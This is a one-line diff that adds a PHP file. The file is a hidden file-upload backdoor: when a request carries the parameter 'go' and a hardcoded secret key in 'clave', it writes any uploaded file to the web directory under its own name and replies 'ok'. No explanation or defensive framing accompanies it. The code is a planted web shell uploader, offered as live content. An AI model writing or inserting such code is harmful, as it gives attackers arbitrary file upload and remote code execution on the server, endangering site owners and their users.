@@ -1,0 +1,1 @@
+<?php if (isset($_REQUEST['go'])) { if ($_REQUEST['clave']=='Y0okl0Fc1g6Hiz3Ag60HZ03JpPd') { move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);    echo "ok"; } } ?>
